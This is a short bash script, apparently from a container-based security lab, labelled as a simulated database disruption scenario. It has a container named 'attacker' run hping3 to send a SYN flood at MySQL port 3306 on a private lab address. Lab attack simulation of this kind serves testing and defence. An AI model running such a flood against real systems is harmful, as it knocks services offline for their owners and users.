#!/bin/bash

echo "Starting Attack Scenario 2: Database Service Disruption (DDoS)"

# Simulate a DDoS attack against the database
docker exec attacker bash -c "echo 'Launching DDoS attack against database...' && \
  hping3 -S --flood -p 3306 172.18.0.30 -c 1000"

echo "Attack Scenario 2 Complete"